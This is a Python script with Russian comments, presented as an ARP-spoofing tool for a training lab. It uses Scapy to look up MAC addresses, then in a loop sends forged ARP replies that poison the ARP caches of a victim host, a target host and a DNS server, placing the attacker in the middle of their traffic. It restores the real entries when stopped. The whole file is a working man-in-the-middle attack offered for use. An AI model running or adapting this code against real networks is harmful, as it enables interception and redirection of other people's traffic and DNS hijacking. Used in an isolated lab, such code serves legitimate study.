
"""ARP-спуфинг для тренировочного контура"""
import os
import signal
import sys
import time
from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp


VICTIM_IP = os.environ.get("VICTIM_IP", "172.28.0.10") # хост, которого обманываем
TARGET_IP = os.environ.get("TARGET_IP", "172.28.0.20") # хост, которым притворяемся
INTERFACE = "eth0" # сетевой интерфейс, через который работаем
INTERFACE_MAC = None # mac сетевого интерфейса
DNS_IP = "172.28.0.53"


running = True


def get_mac(ip: str):
    """
    разрешает IP в MAC через ARP-запрос
    узнаем настоящий MAC нужного хоста перед атакой
    """
    answer, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), # склеиваем слои протокола
        timeout=2,
        retry=3,
        verbose=False,
        iface=INTERFACE,
    )
    for sent_packet, received_packet in answer:
        return received_packet[ARP].hwsrc
    return None

def spoof(target_ip: str, target_mac: str, spoof_ip: str):
    """
    отправляет поддельный ARP-ответ через Ethernet
    цель записывает в свой ARP-кэш: spoof_ip -> interface_mac

    target_ip - ip цели - кому шлем пакет (VICTIM_IP/TARGET_IP)
    target_mac - mac цели
    spoof_ip - ip, которым притворяемся (TARGET_IP/VICTIM_IP)
    """
    
    packet = Ether(dst=target_mac, src=INTERFACE_MAC) / ARP(op=2, pdst=target_ip, 
                                                            hwdst=target_mac, psrc=spoof_ip, 
                                                            hwsrc=INTERFACE_MAC)
    sendp(packet, iface=INTERFACE, verbose=False)


def restore_cache(target_ip: str, target_mac: str, real_ip: str, real_mac: str):
    """
    восстанавливает настоящий ARP-кэш, 
    чтобы жертва и цель не потеряли связь после остановки атаки

    target_ip - ip цели - кому шлем пакет (VICTIM_IP/TARGET_IP)
    target_mac - mac цели
    real_ip - настоящий ip, который нужно восстановить
    real_mac - настоящий mac real_ip
    """
    packet = Ether(dst=target_mac, src=real_mac) / ARP(op=2, pdst=target_ip, 
                                                       hwdst=target_mac, psrc=real_ip, 
                                                       hwsrc=real_mac)
    sendp(packet, iface=INTERFACE, verbose=False, count=5)

def handle_signal(sig, frame):
    """
    обрабатывает сигналы, чтобы 
    ARP восстановился даже при аварийной остановке
    
    sig - идентификатор сигнала
    frame - стековый фрейм на момент прерывания
    """

    global running
    print("\n!!!!!!!!!! Был получен сигнал -> восстанавливаем ARP")
    running = False


def arp_spoof():
    global running, INTERFACE_MAC

    # сигналы вызывают handle_signal
    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    # ======== получаем MAC-адреса цели и жертвы ======== 
    INTERFACE_MAC = get_if_hwaddr(INTERFACE)
    print(f"интерфейс: {INTERFACE}\nMAC интерфейса: {INTERFACE_MAC}")

    victim_mac = get_mac(VICTIM_IP)
    print(f"жертва: {VICTIM_IP} -> {victim_mac}")

    target_mac = get_mac(TARGET_IP)
    print(f"цель: {TARGET_IP} -> {target_mac}")

    dns_mac = get_mac(DNS_IP)
    print(f"MAC DNS: {dns_mac}")

    # ======== атака ========   
    if not victim_mac or not target_mac:
        print("не удалось найти MAС-адреса!!!!!!!")
        return

    print(f"запущен ARP-спуфинг:\n{VICTIM_IP} думает, что мы - {TARGET_IP}")

    try:
        while running:
            spoof(VICTIM_IP, victim_mac, TARGET_IP) # притворяемя целью
            spoof(TARGET_IP, target_mac, VICTIM_IP) # притворяемя жертвой

            # Спуфинг DNS
            if dns_mac:
                spoof(VICTIM_IP, victim_mac, DNS_IP)
                spoof(DNS_IP, dns_mac, VICTIM_IP)

            time.sleep(2)

    finally:
        restore_cache(VICTIM_IP, victim_mac, TARGET_IP, target_mac)
        restore_cache(TARGET_IP, target_mac, VICTIM_IP, victim_mac)

        if dns_mac:
            restore_cache(VICTIM_IP, victim_mac, DNS_IP, dns_mac)
            restore_cache(DNS_IP, dns_mac, VICTIM_IP, victim_mac)
        print("ARP восстановлен")

if __name__ == "__main__":
    try:
        arp_spoof()
    except Exception as e:
        print(f"произошла ошибка: {e}")
        sys.exit(1)
